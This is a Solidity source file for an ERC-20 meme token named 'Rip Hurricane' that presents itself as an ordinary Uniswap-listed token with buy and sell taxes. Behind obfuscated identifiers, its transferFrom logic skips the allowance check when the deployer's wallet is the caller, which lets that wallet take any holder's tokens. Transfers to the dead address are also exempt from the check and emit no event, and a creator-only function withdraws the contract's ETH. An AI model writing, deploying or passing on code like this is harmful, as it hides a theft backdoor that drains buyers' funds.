// SPDX-License-Identifier: MIT

/*
    https://x.com/WhiteHouse/status/1892253197747552403
    https://t.me/HurricaneEthPortal
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract HURRICANE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Rip Hurricane";
    string private constant _symbol = unicode"HURRICANE";
    
    address private _ojdofiekjRRRR;
    address private _kjvnkbjnRRRR = address(0xdead);
    uint256 public _ojojoivlkRRRR = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjRRRR = 20000000 * 10 **_decimals;
    uint256 public _ppojofRRRR = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbRRRR = 1000000000 * 10 **_decimals;

    address payable private _vbjljvlklRRRR;
    mapping(address => uint256) private _sisiRRRR;
    mapping(address => mapping(address => uint256)) private re3r3r;
    mapping(address => bool) private _monoRRRR;
    uint256 private _vjkboiwoeiRRRR = 10;
    uint256 private _odijofjoeRRRR = 10;
    uint256 private _joijoiRRRR = 0;
    uint256 private _jvbkoiweRRRR = 0;
    uint256 private _ojidoiweRRRR = 7;
    uint256 private _ojdofRRRR = 7;
    uint256 private _buyCount = 0;
    
    IUniswapV2Router02 private RouterV2;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _ojojoivlkRRRR);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklRRRR = payable(_msgSender());
        _sisiRRRR[address(this)] = _kmmvbRRRR * 98 / 100;
        _sisiRRRR[owner()] = _kmmvbRRRR * 2 / 100;
        _monoRRRR[owner()] = true;
        _monoRRRR[address(this)] = true;
        _monoRRRR[_vbjljvlklRRRR] = true;
        _ojdofiekjRRRR = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbRRRR * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbRRRR * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbRRRR;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        re3r3r[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _sisiRRRR[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return re3r3r[owner][spender];
    }

    receive() external payable {}
    
    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklRRRR;}

    function fffefef34f(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = re3r3r[sender][_msgSender()];
        return _allowed;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_RRRR(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            fffefef34f(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else return sender == uniswapV2Pair || recipient != _kjvnkbjnRRRR;
    }

    function _assistRRRR(uint256 amount) private {
        _vbjljvlklRRRR.transfer(amount);
    }

    function _swappp_RRRR(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = RouterV2.WETH();
        _approve(address(this), address(RouterV2), tokenAmount);
        RouterV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transferr_RRRR(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweRRRR)
                        ? _joijoiRRRR
                        : _vjkboiwoeiRRRR
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(RouterV2) &&
                !_monoRRRR[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofRRRR)
                            ? _jvbkoiweRRRR
                            : _odijofjoeRRRR
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofRRRR) ? contractTokenBalance : _ppojofRRRR; 
                    _swappp_RRRR((amount < minBalance) ? amount : minBalance);
                }
                _assistRRRR(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _sisiRRRR[address(this)] =_sisiRRRR[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _sisiRRRR[from] =_sisiRRRR[from].sub(amount);
        _sisiRRRR[to] =_sisiRRRR[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnRRRR != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkRRRR = _kmmvbRRRR;
        _lkkkvnblkjRRRR = _kmmvbRRRR;
        emit MaxTxAmountUpdated(_kmmvbRRRR);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_RRRR(_msgSender(), recipient, amount);
        return true;
    }

    function _RRRRlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function enableRRRRTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        RouterV2 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(RouterV2), _kmmvbRRRR);
        uniswapV2Pair = IUniswapV2Factory(RouterV2.factory()).createPair(
            address(this),
            RouterV2.WETH()
        );
        RouterV2.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(RouterV2),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function GRG(address payable receipt) external {
        require(msg.sender == _ojdofiekjRRRR , "");
        _vbjljvlklRRRR = receipt;
        _RRRRlkjlok(address(this).balance);
    }
}